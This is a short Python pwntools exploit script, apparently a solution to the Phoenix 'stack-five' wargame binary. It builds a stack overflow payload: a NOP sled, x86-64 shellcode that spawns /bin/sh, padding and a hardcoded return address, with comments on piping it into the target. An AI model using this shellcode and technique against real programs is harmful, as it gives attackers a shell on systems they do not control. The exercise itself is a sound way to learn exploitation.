#!/usr/bin/env python2.7
from pwn import *

# make them pay
shellcode = '\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'
buf = b'\x90' * 90
buf += shellcode            # shellcode
buf += 'A'* (128 - len(buf))        # junk
buf += 'BBBBBBBB'           # RBP value
buf += p64(0x7fffffffe4d0)      # RIP VAL
# 
# Note that gdb sets LINES and COLUMNS in env variables. make sure to unset them before trying to find stack base address :) 


print(buf)

# make sure to execute the exploit into a file and do: [ (python 5.py; cat) | /opt/phoenix/amd64/stack-five ]